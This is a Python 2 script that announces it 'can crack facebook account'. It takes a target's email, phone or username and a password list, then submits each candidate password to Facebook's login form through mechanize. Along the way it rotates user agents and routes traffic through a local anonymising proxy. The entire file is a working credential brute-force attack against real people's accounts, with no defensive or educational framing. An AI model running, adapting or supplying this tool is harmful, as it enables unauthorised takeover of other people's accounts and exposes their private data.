#!usr/bin/python

import mechanize
import cookielib
import sys
import random

#/home/ubuntu/Desktop/dev/pw.txt
print "Note:- This tool can crack facebook account"
email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
passwordlist = str(raw_input("Enter the name of the password list file : "))
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
login = 'https://www.facebook.com/login.php?login_attempt=1'

def attack(password):
	
	try:
		sys.stdout.write("\rtrying .... %s  " % password)
		sys.stdout.flush()
		br.addheaders = [('User-agent',random.choice(useragents))]
		br.set_proxies({"http" : "127.0.0.1:8118"})
#		br.open("http://icanhazip.com/")
#		print br.response().read()
		
		site = br.open(login)
		br.select_form(nr=0)
		
		br.form['email']=email
		br.form['pass']=password
		br.submit()
		log= br.geturl()
		if log != login:
			print "\n\n Success....!!!"
			print "\n Password is : %s \n" % (password)
			sys.exit(1)
		
		
	except KeyboardInterrupt:
			print "\n[*] Exiting program .. "
			sys.exit(1)


def search():
	
	global password
	for password in passwords:
		attack(password.replace('/n',""))

def check():
	
	global br
	global passwords
	try:
		#Browser
		br=mechanize.Browser()
		#cookie jar
		cj = cookielib.LWPCookieJar()
		br.set_cookiejar(cj)
		# Browser options
		br.set_handle_equiv(True)
		br.set_handle_redirect(True)
		br.set_handle_referer(True)
		br.set_handle_robots(False)
		br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	except KeyboardInterrupt:
		print "\n [*] program exiting.....]"
		sys.exit(1)
		
	try:
		pwfileh=open(passwordlist,"r")
		passwords = pwfileh.readlines()
		k=0
		while k < len(passwords):
			passwords[k] = passwords[k].strip()
			k += 1
	except IOError:
		print "invalid path"
		sys.exit(1)
	except KeyboardInterrupt:
		print "\n [*] program exiting.....]"
		sys.exit(1)
		
	try:
		print "Account to crack  %s " % email
		print "loaded  :  ", len(passwords), "paswords"
		print "Cracking .... please wait...."
		
	except KeyboardInterrupt:
		print "\n [*] program exiting.....]"
		sys.exit(1)
	try:
		search()
	except KeyboardInterrupt:
		print "\n [*] program exiting.....]"
		sys.exit(1)


if __name__ == '__main__':
	check()
